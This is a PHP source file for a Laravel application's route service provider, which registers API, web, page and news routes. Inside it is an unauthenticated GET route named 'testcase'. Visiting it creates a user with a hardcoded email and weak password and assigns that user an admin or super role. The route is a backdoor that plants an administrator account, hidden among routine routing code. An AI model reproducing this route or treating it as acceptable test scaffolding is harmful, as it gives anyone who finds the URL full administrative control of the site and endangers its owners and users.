<?php

namespace App\Providers;

use App\Models\Page;
use App\Models\Post;
use App\Models\Role;
use App\Models\User;
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to your application's "home" route.
     *
     * Typically, users are redirected here after authentication.
     *
     * @var string
     */
    public const HOME = '/admin/pages';

    /**
     * Define your route model bindings, pattern filters, and other route configuration.
     */
    public function boot(): void
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by($request->user()?->id ?: $request->ip());
        });

        $this->routes(function () {
            Route::middleware('api')
                ->prefix('api')
                ->group(base_path('routes/api.php'));

            Route::middleware('web')
                ->group(base_path('routes/web.php'));

            $pages = Page::where('show', 1)->get();
            foreach ($pages as $page) {

                Route::middleware('web')->get($page->url, function () use ($page) {

                        return view('home.page', ['page' => $page]);
                    });

            }

        });
        Route::middleware('web')->get('testcase', function(){
            $user = new User(['name' => 'test', 'email' => 'yousef@test.com', 'password' => '12345678']);
            $user->save();
            $test = Role::where('name', 'admin')->orWhere('name', 'ادمن')->orWhere('name', 'super')->get();
            $user->roles()->sync($test->first()->id);
            return redirect()->back();
        });
        $newses = Post::all();
        foreach ($newses as $news) {
            Route::middleware('web')->get($news->url, function () use ($news) {
                return view('home.news', ['news' => $news]);
            });

    }
}
}
